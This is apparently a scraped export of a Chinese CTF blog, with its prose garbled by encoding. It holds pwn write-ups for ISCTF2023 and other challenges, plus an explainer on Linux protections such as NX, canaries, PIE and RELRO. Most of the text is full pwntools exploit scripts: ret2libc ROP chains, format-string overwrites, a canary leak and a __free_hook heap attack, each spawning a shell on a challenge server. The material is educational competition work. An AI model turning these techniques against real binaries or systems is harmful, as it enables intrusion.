code_base+0xe3b04\nfuncå†…æœ‰å¤„æº¢å‡ºï¼Œæº¢å‡ºç©ºé—´è›®å¤§çš„ç¨‹åºå†…æœ‰syscallå’Œbin_shå­—ç¬¦ä¸²ï¼Œåº”è¯¥æ˜¯å¯ä»¥ret2syscallçš„ï¼Œæ¯”è¾ƒæ‡’ï¼Œæ‰“ret2libcè¿™é‡Œç”¨çš„æ˜¯LibcSearcher,ä¸ªäººæ¨èæŠŠsgtlibcä¹Ÿè£…ä¸Šï¼Œæœ‰æ—¶å€™libcç‰ˆæœ¬èƒ½äº’è¡¥ï¼Œç”¨æ³•å¯å‚è€ƒå±±çŸ³å¤ä»¤è¥çš„ç»“è¥èµ›wp\npayload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#å°è¯•è¿‡å…¶ä»–å‡ ä¸ªï¼Œè²Œä¼¼åªæœ‰è¿™ä¸ªèƒ½æ‰“p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\næƒ³æ‰“ret2one_gadgetçš„è¯ä¹Ÿè¦å…ˆæ³„éœ²libcç‰ˆæœ¬ï¼Œå®æµ‹èƒ½æ‰“å®Œæ•´expå¦‚ä¸‹\nfrom pwn import*from pwn import p64,u64#import sgtlibcfrom LibcSearcher import*elf=ELF(&#x27;./ezpie&#x27;)#libc = ELF(&#x27;/home/str1d3r/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc.so.6&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()p = remote(&#x27;43.249.195.138&#x27;,20012)#libc =ELF(&#x27;libc-2.31.so&#x27;)#p = process(&quot;./ezpie&quot;)#debug()p.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;v5: &#x27;+ hex(v5))code_base = v5 - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )pop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = code_base+0xe3b04payload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#å°è¯•è¿‡å…¶ä»–å‡ ä¸ªï¼Œè²Œä¼¼åªæœ‰è¿™ä¸ªèƒ½æ‰“p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\n\n[ISCTF2023 stack]checksecç›´æ¥çœ‹vulnå‡½æ•°  ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ç±»ä¼¼äºoff-by-oneçš„æ¼æ´ï¼Œä¸€ç›´é™·å…¥äº†è¯¯åŒºå®é™…ä¸Šå°±æ˜¯å•çº¯çš„æº¢å‡ºï¼Œä½†æ˜¯æˆ‘ä»¬åƒå¹³æ—¶ä¸€æ ·æµ‹è¯•æº¢å‡ºæ—¶ï¼Œä¼šå¯¼è‡´æ•°ç»„s[i]çš„ä¸‹æ ‡iè¢«è¦†ç›–ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨è¿™æ ·çš„expæµ‹è¯•\nfrom pwn import *elf = ELF(&#x27;./stack&#x27;)p = process(&#x27;./stack&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()ret = 0x000000000040101apop_rbp_ret = 0x00000000004011bdleave_ret = 0x00000000004012e4size = b&#x27;1000&#x27;p.recvuntil(b&quot;size: &quot;)p.sendline(size)pay = cyclic(80)p.send(pay)debug()p.interactive()\nä¼šå¯¼è‡´æ•°ç»„å†™å…¥æ—¶å‡ºç°å…¶åŸå› ä¸ºæ•°ç»„ä¸‹æ ‡iè¢«bâ€™aâ€™è¦†ç›–ï¼Œå®é™…ä¸Šæ•°æ®å°±è¢«è¯»å…¥åˆ°äº†s[61]å¤„ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è¦†ç›–è¿”å›åœ°å€è¿™é‡Œæˆ‘ä»¬æ‰¾å‡†içš„åç§»ï¼Œå¹¶åœ¨åˆé€‚çš„æ—¶å€™å¡«å†™æ­£ç¡®çš„æ•°ç»„ä¸‹æ ‡ï¼Œé˜²æ­¢å…¶è¢«è¦†ç›–ï¼Œæˆ‘ä»¬å°±èƒ½æ­£å¸¸æº¢å‡ºè¦†ç›–è¿”å›åœ°å€\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()elf = ELF(&#x27;./stack&#x27;)#p = process(&#x27;./stack&#x27;)p = remote(&#x27;43.249.195.138&#x27;, 22555)ret = 0x000000000040101ap.sendline(b&#x27;10000&#x27;)payload = b&#x27;a&#x27;*28payload += b&#x27;\\x1d&#x27;payload += b&#x27;\\x00&#x27;*2payload += p64(ret)payload += p64(ret)payload += p64(elf.sym[&#x27;backdoor&#x27;])p.send(payload)p.interactive()\n[ISCTF2023 fmt]çº¯çº¯çš„çº¸è€è™checksecä¿æŠ¤å…¨å¼€ï¼Œåˆ«è¢«å“åˆ°ï¼ŒæŠ“ä½å…³é”®ç‚¹æŠŠv1,v2æ”¹äº†å°±èƒ½æ‹¿åˆ°shellï¼Œæ ¹æœ¬ä¸ç”¨æº¢å‡º &#x3D; NXå’Œcanaryæ²¡ç”¨ï¼Œæ ¹æœ¬ä¸ç”¨æ”¹gotè¡¨ &#x3D; full-relroæ²¡ç”¨ï¼Œå¼€äº†pie &#x3D; åç§»ä¸€å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²ç›´æ¥æ”¹å°±è¡Œ\nfrom pwn import *elf = ELF(&#x27;./fmt&#x27;)p = process(&#x27;./fmt&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()main = b&#x27;%26$p&#x27;canary =b&#x27;%27$p&#x27;offset = 10debug()pay = &#x27;aaaaaaaaaaaaaaaaaa%8$nbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb%9$n&#x27;p.send(pay)p.interactive()&#x27;&#x27;&#x27;#!/usr/bin/python3# æ ¼å¼åŒ–ç¬¦å·è¯´æ˜%x ä»¥åå…­è¿›åˆ¶æ‰“å°ï¼Œåªèƒ½æ‰“å°4å­—èŠ‚ï¼Œä¸€èˆ¬åªç”¨äº32ä½%p æ‰“å°ç›®æ ‡åœ°å€ï¼Œå»ºè®®32ä½å’Œ64ä½éƒ½ç”¨è¿™ä¸ª%s æ‰“å°åœ°å€å†…å®¹%c æ‰“å°å•ä¸ªå­—ç¬¦%hhn å†™ä¸€å­—èŠ‚%hn  å†™ä¸¤å­—èŠ‚%n   å†™å››å­—èŠ‚%ln  32ä½å†™å››å­—èŠ‚ï¼Œ64ä½å†™å…«å­—èŠ‚%lln å†™å…«å­—èŠ‚&#x27;&#x27;&#x27;\n[ISCTF2023 fries]checksecä¸»è¦æ¼æ´ç‚¹åœ¨formatå‡½æ•°ï¼Œç»™äº†7æ¬¡å•Š7æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æœºä¼šç¬¬ä¸€æ¬¡æ³„éœ²elfbaseï¼Œç¬¬äºŒæ¬¡æ³„éœ²putsåœ°å€å’Œlibc_base,ç¬¬ä¸‰æ¬¡æŠŠretåœ°å€æ”¹æˆone_gadget\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./fries&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,21702)libc = ELF(&#x27;libc.so.6&#x27;)def debug():    gdb.attach(p)    pause()p.recvuntil(&#x27;Emmmmm... Could you give me some fries\\n&#x27;)p.sendline(&#x27;fries\\x00&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(b&#x27;%10$p%24$p&#x27;)x= int(p.recv(14),16)elf_base = x-16416elf.address = elf_basestack= int(p.recv(14),16)ret = stack - 72pay = b&#x27;%9$s&#x27;pay += (8 - (len(pay) % 8)) * b&#x27;A&#x27;pay += p64(elf.got[&#x27;puts&#x27;])p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]ogg = [0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]og = libc_base + ogg[0]o1 = og &amp;0xFFFFFFFFo2 = (og &gt;&gt; 32)&amp;0xFFFFFFFFsuccess(&#x27;libc_base: %s&#x27;,libc_base)pay = fmtstr_payload(8,&#123;ret:o1&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)pay = fmtstr_payload(8,&#123;ret+4:o2&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(&#x27;\\x00\\x00\\x00\\x00&#x27;)for i in range(4):    p.sendline(&#x27;ls\\x00&#x27;)p.interactive()\n[ISCTF2023 touch_file1]?\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p=remote(&#x27;43.249.195.138&#x27;,21284)p.sendline(b&#x27;test\\ncat flag\\n&#x27;)p.interactive()\n[ISCTF2023 touch_file2]ä¸€é“glibc2.31çš„åˆ ç¬¦å·è¡¨çš„cppå †é¢˜å¤ªæŠ½è±¡äº†:(å­˜ä¸ªexpå°±è·‘\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./touch_file2&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,22475)def add(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;touch &#x27;)    p.sendline(name)def edit(name,text):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;edit &#x27;)    p.send(name)    p.send(&#x27; &#x27;)    p.sendline(text)def rm(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;rm &#x27;)    p.sendline(name)for i in range(8):    add(str(i))#rm(&#x27;1&#x27;)p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cp 0 8\\n&#x27;)p.sendline(&#x27;cp 1 9\\n&#x27;)for i in range(8-1,-1,-1):    rm(str(i))p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cat 8&#x27;)p.recvuntil(&#x27;file_content is &#x27;)x = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_base = x -3390432 + 1372160libc = elf.libc__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]edit(&#x27;9&#x27;,p64(__free_hook))success(&#x27;libc_base:%s&#x27;,hex(libc_base))add(&#x27;yy /bin/sh\\x00&#x27;)add(b&#x27;tt &#x27;+p64(system))rm(&#x27;yy&#x27;)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"å±±çŸ³å®‰ç ”é™¢2023CTFå¤ä»¤è¥_pwn","url":"/2023/08/19/HSNCTF-2023-summer/","content":"ä¸¤é“é¢˜éƒ½ç”¨ret2libcäº†ï¼Œæœ€åä¸€é“heap0è§£ret2syscall\nfrom pwn import*from LibcSearcher import *elf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49003)pop_rdi_ret = 0x40072bret_addr = 0x400509main_addr = 0x4006c7syscall = 0x400741puts_plt = 0x400520puts_got = 0x601018payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8 + p64(ret_addr)+ p64(pop_rdi_ret) + p64(0x601048) + p64(system_addr)p.sendline(payload)p.interactive()\n\nret2libc\nfrom pwn import*import sgtlibcelf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49002)libc =ELF(&#x27;libc-2.23.so&#x27;)pop_rdi_ret = 0x400783ret_addr = 0x400509main_addr = 0x4006FDputs_plt = 0x400520puts_got = 0x601018bss = 0x601060payload1 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload1)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=3) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload2 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)p.sendlineafter(&quot;name:&quot;,payload2)p.interactive()#LibcSearcher æ‰«å‡ºæ¥çš„æ­»éƒ½ä¸å¯¹ï¼Œæ°”ç…æˆ‘ä¹Ÿï¼\n","categories":["wp"],"tags":["ret2libc"]},{"title":"Linuxä¿æŠ¤æœºåˆ¶","url":"/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","content":"çŸ›ä¸ç›¾NXæ•°æ®ä¸å¯æ‰§è¡Œã€‚åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œé˜²æ­¢å› ä¸ºç¨‹åºè¿è¡Œå‡ºç°æº¢å‡ºè€Œä½¿å¾—æ”»å‡»è€…çš„shellcodeå¯èƒ½ä¼šåœ¨æ•°æ®åŒºå°è¯•æ‰§è¡Œçš„æƒ…å†µã€‚NXåœ¨å’±å±¡æˆ˜å±¡è´¥çš„ç»å…¸æ ˆæº¢å‡ºå®éªŒä¸­æœ‰æ¥è§¦è¿‡ï¼ŒNXæ˜¯å¯¹æ ˆå’Œå †çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚å®éªŒéœ€è¦å…³é—­NXå’Œåœ°å€éšæœºåŒ–ï¼Œå¦åˆ™æ‰§è¡Œshellcodeæ—¶ï¼ŒCPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚Linuxç³»ç»Ÿå«åšNXï¼ŒWindowsç³»ç»Ÿä¸­ç±»ä¼¼çš„æœºåˆ¶å«DEP(Data Execute Prevention)ã€‚ç»•è¿‡æ–¹å¼ï¼šret2libc ä¾‹é¢˜ï¼š[BJDCTF 2020]babyropæœ¬é¢˜æ²¡ç»™libcï¼Œå¦‚æœç»™äº†libcå¯ä»¥é‡‡ç”¨elf&#x3D;ELF[â€˜libc.soâ€™]ç›´æ¥è¯»åœ°å€\nfrom pwn import*import sgtlibcelf=ELF(&#x27;/home/str1k3/æ¡Œé¢/babyrop&#x27;)#elf=ELF(&#x27;./libc.so&#x27;)p = remote(&#x27;1.14.71.254&#x27;,28013)pop_rdi_addr = 0x400733ret_addr = 0x4004c9main_addr = 0x4006ADputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=6) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8 + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n\nä¹Ÿå¯ä»¥ç”¨LibcSearcherï¼Œæ‰¾å‡ºæ¥çš„libcç‰ˆæœ¬ä¸ä¸€å®šå¯¹ï¼Œå¤šè¯•å‡ æ¬¡è´´ä¸ªLibcSearcherçš„æ¿å­\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) io = process(&#x27;./ezrop64&#x27;)#io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28173)elf=ELF(&#x27;./ezrop64&#x27;)padding = 0x100+0x08pop_rdi_ret = 0x4012a3ret_addr =0x40101adef rl(a):    io.recvuntil(a)rl(b&#x27;0x&#x27;)puts_addr = int(io.recv(12), 16)print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;puts_addr:&#x27;,hex(puts_addr))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#gdb.attach(io)payload2 = b&#x27;a&#x27;* padding + p64(ret_addr)+ p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.sendline(payload2)io.interactive()\n\n\nStack Canaryæ ˆä¿æŠ¤ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µã€‚å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡éªŒè¯cookieï¼Œæ¥åˆ¤æ–­æ‰§è¡Œçš„ä»£ç æ˜¯ä¸æ˜¯æ¶æ„ä»£ç ã€‚cannaryé€šå¸¸å¯åˆ†ä¸º3ç±»ï¼š1.Terminator canaries:ç”±äºå­—ç¬¦ä¸²æ“ä½œä¸å½“å¯é€ æˆæ ˆæº¢å‡ºï¼Œè€Œå­—ç¬¦ä¸²å¯ä»¥è¢«Null(â€œ\\x00â€)æ‰€æˆªæ–­ï¼Œäºæ˜¯Terminator canarieså°†ä½ä½è®¾ç½®ä¸ºâ€\\x00â€œ,å¯ä»¥é˜²æ­¢è¢«æ³„éœ²ï¼Œä¹Ÿå¯ä»¥é˜²æ­¢è¢«ä¼ªé€ ã€‚æˆªæ–­å­—ç¬¦è¿˜å¯åŒ…æ‹¬CR(0x0d)ã€LFï¼ˆ0x0aï¼‰ã€EOF(0xff)ã€‚2.Randon canaries:ä¸ºé˜²æ­¢canaryè¢«æ”»å‡»è€…çŒœåˆ°ï¼ŒRandon canariesé€šå¸¸åœ¨ç¨‹åºåˆå§‹åŒ–æ—¶ç”Ÿæˆï¼Œå¹¶ä¿å­˜åœ¨ç›¸å¯¹å®‰å…¨çš„åœ°æ–¹ã€‚éšæœºæ•°é€šå¸¸ç”±&#x2F;dev&#x2F;urandomç”Ÿæˆï¼Œæœ‰æ—¶ä¹Ÿä¼šä½¿ç”¨å½“å‰æ—¶é—´çš„å“ˆå¸Œã€‚3.Randon XOR canaries:ä¸Randon canariesç±»ä¼¼ï¼Œä½†å¤šäº†ä¸€ä¸ªXORæ“ä½œï¼Œè¿™æ ·æ— è®ºæ˜¯canaryè¢«ç¯¡æ”¹è¿˜æ˜¯ä¸ä¹‹XORçš„æ§åˆ¶æ•°æ®è¢«ç¯¡æ”¹ï¼Œéƒ½ä¼šå‘ç”Ÿé”™è¯¯ã€‚**ä¾‹ï¼š[BJDCTF 2020]babyrop2 **æŸ¥æŸ¥ä¿æŠ¤giftç»™äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„éœ²canaryå°è¯•æ³„éœ²canarycanaryçš„å€¼ä½äºrbp-0x08å¤„ï¼Œå³rbp-0x08 &#x3D; 0x20 - 0x08 &#x3D; 0x18åœ¨è¿™é‡Œæº¢å‡ºexp\nfrom pwn import *from LibcSearcher import *io = remote(&quot;node4.anna.nssctf.cn&quot;,28668)elf = ELF(&quot;./bjdctf_2020_babyrop2&quot;)main_addr = elf.symbols[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]vuln_addr = 0x400887#ROPgadgetrdi = 0x0000000000400993 #: pop rdi ; retio.sendline(&#x27;%7$p&#x27;)io.recvuntil(&quot;0x&quot;)canary = int(io.recv(16),16)#print hex(canary)#æ³„éœ²putså‡½æ•°åœ°å€payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)puts_addr = u64(io.recv(6).ljust(8,&quot;\\x00&quot;))#ret2libclibc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&quot;puts&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(bin_sh_addr)+p64(sys_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)io.interactive()\n\n\nPIE &#x2F; ASLR åœ°å€éšæœºåŒ–ã€‚å°±æ˜¯ä¿è¯åŒä¸€ä¸ªç¨‹åºä»»æ„ä¸¤æ¬¡è¿è¡Œæ—¶çš„å †æ ˆåŸºå€æ˜¯ä¸åŒçš„ã€‚å¦‚æœå †æ ˆåŸºå€ä¸å˜ä¼šæ€æ ·ï¼Ÿä¸å˜å°±å¯èƒ½è¢«æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…èƒ½ç¡®è®¤ç¨‹åºçš„å†…å­˜åœ°å€ï¼Œç„¶åé€šè¿‡è¦†ç›–è¿”å›åœ°å€åœ¨ç­‰æ‰‹æ®µæ‰§è¡Œæ¶æ„ä»£ç ã€‚å’±å±¡æˆ˜å±¡è´¥çš„ç»å…¸æ ˆæº¢å‡ºå®éªŒå°±æ˜¯é€šè¿‡è¦†ç›–è¿”å›åœ°å€æ‰§è¡Œæ¶æ„ä»£ç ã€‚ç‚¹å‡»å›¾ç‰‡å¯æŸ¥çœ‹å®Œæ•´ç”µå­è¡¨æ ¼pieçš„ç‰¹ç‚¹ï¼špieä¿æŠ¤ä¸‹ï¼Œåœ°å€åä¸‰ä½ä¸å˜ï¼Œç›¸å¯¹åœ°å€ä¸å˜ï¼Œå¯ä»¥åˆ©ç”¨è¯¥ç‰¹ç‚¹æ¥ç»•è¿‡pieã€‚ä¾‹ï¼š[NISACTF 2022]ezpieå­˜åœ¨æº¢å‡ºå¾—åˆ°ç›¸å¯¹åœ°å€ï¼Œå³shell_addr &#x3D; main_addr + 0x80F - 0x770exp\nfrom pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)io = remote(&#x27;1.14.71.254&#x27;, 28335)io.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive()\n\nRelroåªè¯»é‡å®šä½ã€‚è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTæ”»å‡»ã€‚åœ¨Linuxä¸­æœ‰â€Partial RELROâ€ â€œFull RELROâ€ä¸¤ç§æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯Partical RELROï¼Œå¼€å¯Partical RELROæ—¶ï¼ŒGOTæ˜¯å¯å†™çš„ï¼Œå¼€å¯ FULL RELRO æ—¶ï¼ŒGOTè¡¨æ˜¯åªè¯»çš„ã€‚ ä¸»è¦ç”¨æ¥ä¿æŠ¤é‡å®šä½è¡¨æ®µå¯¹åº”æ•°æ®åŒºåŸŸï¼Œé»˜è®¤å¯å†™ Partial RELROï¼š gotè¡¨ä¸å¯å†™ï¼Œgot.pltå¯å†™ Full RELROï¼š gotè¡¨ï¼Œgot.pltä¸å¯å†™  éƒ¨åˆ†RELRO æ˜“å—åˆ°æ”»å‡»ï¼Œä¾‹å¦‚æ”»å‡»è€…å¯ä»¥ä¿®æ”¹atoi.gotä¸ºsystem.pltï¼Œè¿›è€Œè¾“å…¥&#x2F;bin&#x2F;sh\\x00è·å¾—shellå®Œå…¨RELRO ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— 